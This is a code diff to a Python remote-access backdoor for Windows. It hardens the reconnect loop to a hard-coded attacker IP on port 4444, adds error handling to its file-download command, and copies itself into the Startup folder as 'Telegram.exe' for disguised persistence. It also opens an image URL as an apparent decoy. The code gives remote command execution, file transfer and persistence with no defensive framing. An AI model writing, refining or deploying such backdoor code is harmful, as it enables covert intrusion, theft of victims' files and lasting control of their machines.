@@ -20,8 +20,14 @@ from playsound import playsound
 
 class Backdoor:
     def __init__(self, ip, port):
-        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.connection.connect((ip, port))
+        con_status = False
+        while not con_status:
+            try:
+                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.connection.connect((ip, port))
+                con_status = True
+            except:
+                time.sleep(3)
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -83,7 +89,10 @@ class Backdoor:
                     command_result = self.change_working_directory_to(path)
                 elif command.split()[0] == "download":
                     file_name = command.replace("download ", "")
-                    command_result = self.read_file(file_name)
+                    try:
+                        command_result = self.read_file(file_name)
+                    except:
+                        command_result = False
                 elif command.split()[0] == "upload":
                     file_name = command.split()[1]
                     file_content = command.replace(f"upload {file_name} ", "")
@@ -122,7 +131,7 @@ class Backdoor:
 
 username = subprocess.getoutput("echo \%username%")
 path = f"C:\\Users\\{username[1::]}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
-command = f'copy matanal.exe "{path}"'
+command = f'copy Telegram.exe "{path}"'
 os.system(command)
 
 # time.sleep(10)
@@ -151,6 +160,8 @@ gimn.start()
 
 webbrowser.open('https://f8n-production-collection-assets.imgix.net/0x30c7123FA156772020814bC39b4559Fc94deebc8/1/nft.jpg?q=80&auto=format%2Ccompress&cs=srgb&max-w=1680&max-h=1680')
 
+
 my_backdoor = Backdoor("185.247.119.121", 4444)
 my_backdoor.run()
+
 
